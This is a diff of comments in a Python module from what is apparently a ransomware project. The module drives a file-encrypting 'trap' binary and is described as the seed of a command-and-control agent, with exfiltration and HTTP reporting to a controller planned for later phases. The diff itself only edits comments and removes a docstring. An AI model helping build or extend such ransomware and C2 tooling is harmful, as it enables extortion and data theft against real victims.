@@ -1,13 +1,5 @@
-"""Phase 1 runner: drive the trap binary from Python, return structured results.
-
-This module is the embryo of the C2 agent (Architecture B methodology).
-Everything built in later phases (HTTP polling, job state, exfiltration)
-wraps around run_trap() — the function signature and return shape are frozen
-from this point on.
-"""
-
 # ============================================================================
-# PLAIN-LANGUAGE SUMMARY — WHAT PHASE 1 DID AND WHAT THIS FILE ACHIEVES
+# SUMMARY | WHAT PHASE 1 DID AND WHAT THIS FILE ACHIEVES
 # ============================================================================
 #
 # THE BIG PICTURE
@@ -20,7 +12,7 @@ from this point on.
 # WHAT THIS FILE DOES, STEP BY STEP
 #   1. It finds trap's "home" folder (the folder where trap's keys live).
 #      Paths are calculated from THIS FILE's location, never from wherever
-#      the terminal happens to be — so it works the same no matter where
+#      the terminal happens to be, so it works the same no matter where
 #      you start it from.
 #   2. run_trap() runs the trap program as a child process with three
 #      important details:
@@ -31,13 +23,13 @@ from this point on.
 #          it runs from (get this wrong and keys appear in random places);
 #        - a timeout is set, so a stuck run can never block us forever.
 #   3. It reads the child's two output channels and sorts the information:
-#        - stdout: lines like "Encrypted: /some/path" — these are counted
+#        - stdout: lines like "Encrypted: /some/path", these are counted
 #          and collected, because they are the ONLY reliable per-file
 #          progress signal;
 #        - stderr: error messages, kept as a list;
 #        - the exit code, kept separately, because it means something
 #          different from the errors (1 = failed to start, 0 = the walk
-#          finished — even if every file failed).
+#          finished, even if every file failed).
 #   4. It returns all of that as one Python dictionary. Later phases will
 #      send this dictionary over HTTP to the controller.
 #
@@ -64,7 +56,7 @@ import json
 import subprocess
 from pathlib import Path
 
-# Resolve paths relative to this file, not the caller's CWD. The agent will be
+# Resolve paths relative to this file, not the caller's CWD ( current working directory). The agent will be
 # started from cron/services/random directories; anchoring to the file location
 # keeps trap's home (and its CWD-relative keys) deterministic.
 C2_ROOT = Path(__file__).resolve().parent.parent          # ransomware/
